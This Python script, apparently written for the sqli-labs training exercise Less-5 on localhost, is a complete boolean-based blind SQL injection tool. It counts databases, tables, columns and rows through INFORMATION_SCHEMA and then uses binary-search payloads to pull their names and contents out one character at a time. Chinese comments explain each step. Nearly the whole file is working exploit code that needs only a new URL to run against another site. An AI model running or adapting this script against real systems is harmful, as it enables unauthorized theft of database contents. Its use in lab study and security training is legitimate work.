#Author:p0desta
#not me
import requests
import string
import sys
global findBit
import binascii
Flag_yes = "You are in"    #回显的文本，因为less5是屏蔽错误提示的，所以回显就只有这个

'''

'''
def sendPayload(payload):
         url = 'http://127.0.0.1/sqli/Less-5/?id=1'+ payload
         content = requests.get(url).text   #返回的content为对象的文本
         return content

'''
获取数据库名称的长度
while循环到回显正常后返回的值就是数据库名称的长度
'''
def findDatabaseNumber():
         count = 1
         while count:
                 payload = "'AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="
                 payload = payload + str(count) + "--+"
                 recv = sendPayload(payload)
                 if "You are in" in recv:
                          return count
                 else:
                          count += 1

'''
获取表名长度
原理同上
'''
def findTableNumber(dbname):
         count = 1
         dbname = '0x' + str(binascii.b2a_hex(dbname))
         while count:
                 payload = "'AND (select count(table_name) from information_schema.tables where table_schema="+dbname+") ="
                 payload = payload + str(count) + "--+"
                 recv = sendPayload(payload)
                 if Flag_yes in recv:
                          return count
                 else:
                          count += 1

'''
获取列名的长度
'''
def findColumnNumber(tableName):
         count = 1
         tableName = '0x' + str(binascii.b2a_hex(tableName))
         while count:
                 payload = "'AND (select count(column_name) from information_schema.columns where table_name="+tableName+") ="
                 payload = payload + str(count) + "--+"
                 recv = sendPayload(payload)
                 if Flag_yes in recv:
                          return count
                 else:
                          count += 1
def findDataNumber(columnName,tableName):
         count = 1
         while count:
                 payload = "'AND (select count("+columnName+") from "+tableName+") ="
                 payload = payload + str(count) + "--+"
                 recv = sendPayload(payload)
                 if Flag_yes in recv:
                          return count
                 else:
                          count += 1



def getDatabaseName(dbNum):
         global findBit
         for k in range(dbNum):
                 i = 1
                 while i :
                          findBit = 0
                          doubleSearchDbs(-1,255,i,k)
                          i += 1
                          if findBit == 1:
                                   sys.stdout.write("`\r\n")
                                   break
def getTableName(tableNum,dbName):
         global findBit
         dbName = '0x' + str(binascii.b2a_hex(dbName))
         for k in range(tableNum):
                 i = 1
                 while i :
                          findBit = 0
                          doubleSearchTable(-1,255,i,k,dbName)
                          i += 1
                          if findBit == 1:
                                   sys.stdout.write("\r\n")
                                   break
def getColumnName(columnNum,tableName):
         global findBit
         tableName = '0x' + str(binascii.b2a_hex(tableName))
         for k in range(columnNum):
                 i = 1
                 while i :
                          findBit = 0
                          doubleSearchColumn(-1,255,i,k,tableName)
                          i += 1
                          if findBit == 1:
                                   sys.stdout.write("\r\n")
                                   break
def getDataName(dataNum,columnName,tableName):
         global findBit
         for k in range(dataNum):
                 i = 1
                 while i :
                          findBit = 0
                          doubleSearchData(-1,255,i,k,columnName,tableName)
                          i += 1
                          if findBit == 1:
                                   sys.stdout.write("\r\n")
                                   break

'''
二分法寻找需要的信息
'''
def doubleSearchDbs(leftNum,rightNum,i,k):
         global findBit
         midNum = (leftNum + rightNum) / 2
         if (rightNum != leftNum +1):
                 querysql = "'AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT " + str(k) + ",1)," + str(i) + ",1)) > " + str(midNum) + "--+"
                 recv = sendPayload(querysql)
                 if Flag_yes in recv:
                          doubleSearchDbs(midNum,rightNum,i,k)
                 else:
                          doubleSearchDbs(leftNum,midNum,i,k)
         else:
                 if rightNum != 0:
                          sys.stdout.write(chr(rightNum))
                          sys.stdout.flush()
                 else:
                          findBit = 1
                          return


def doubleSearchTable(leftNum,rightNum,i,k,dbName):
         global findBit
         midNum = (leftNum + rightNum) / 2
         if (rightNum != leftNum +1):
                 querysql = "'AND ASCII(substr((SELECT table_name  FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="+ dbName+" limit " + str(k) + ",1)," + str(i) + ",1)) > " + str(midNum) + "--+"
                 recv = sendPayload(querysql)
                 if Flag_yes in recv:
                          doubleSearchTable(midNum,rightNum,i,k,dbName)
                 else:
                          doubleSearchTable(leftNum,midNum,i,k,dbName)
         else:
                 if rightNum != 0:
                          sys.stdout.write(chr(rightNum))
                          sys.stdout.flush()
                 else:
                          findBit = 1
                          return
def doubleSearchColumn(leftNum,rightNum,i,k,tableName):
         global findBit
         midNum = (leftNum + rightNum) / 2
         if (rightNum != leftNum +1):
                 querysql = "'AND ascii(substr((SELECT column_name FROM INFORMATION_SCHEMA.columns WHERE TABLE_name="+ tableName+" limit " + str(k) + ",1)," + str(i) + ",1)) > " + str(midNum) + "--+"
                 recv = sendPayload(querysql)
                 if Flag_yes in recv:
                          doubleSearchColumn(midNum,rightNum,i,k,tableName)
                 else:
                          doubleSearchColumn(leftNum,midNum,i,k,tableName)
         else:
                 if rightNum != 0:
                          sys.stdout.write(chr(rightNum))
                          sys.stdout.flush()
                 else:
                          findBit = 1
                          return
def doubleSearchData(leftNum,rightNum,i,k,columnName,tableName):
         global findBit
         midNum = (leftNum + rightNum) / 2
         if (rightNum != leftNum +1):
                 querysql = "'AND ascii(substr((SELECT "+ columnName+" from " +tableName + " limit " + str(k) + ",1)," + str(i) + ",1)) > " + str(midNum) + "--+"
                 recv = sendPayload(querysql)
                 if Flag_yes in recv:
                          doubleSearchData(midNum,rightNum,i,k,columnName,tableName)
                 else:
                          doubleSearchData(leftNum,midNum,i,k,columnName,tableName)
         else:
                 if rightNum != 0:
                          sys.stdout.write(chr(rightNum))
                          sys.stdout.flush()
                 else:
                          findBit = 1
                          return
def exp():
         dbNum = findDatabaseNumber()
         print ("the number of database is "+str(dbNum))
         getDatabaseName(dbNum)
         dbName = (input('Find tables from :'))
         tableNum = findTableNumber(dbName)
         print ("the nameber of table is: " + str(tableNum) )
         getTableName(tableNum,dbName)
         tableName = (input('Find columns from :'))
         columnNum = findColumnNumber(tableName)
         print ("the number of column is: " + str(columnNum))
         getColumnName(columnNum,tableName)
         columnName = (input('Find data from :'))
         dataNum = findDataNumber(columnName,tableName)
         print ("the number of data is :" + str(dataNum))
         getDataName(dataNum,columnName,tableName)
exp()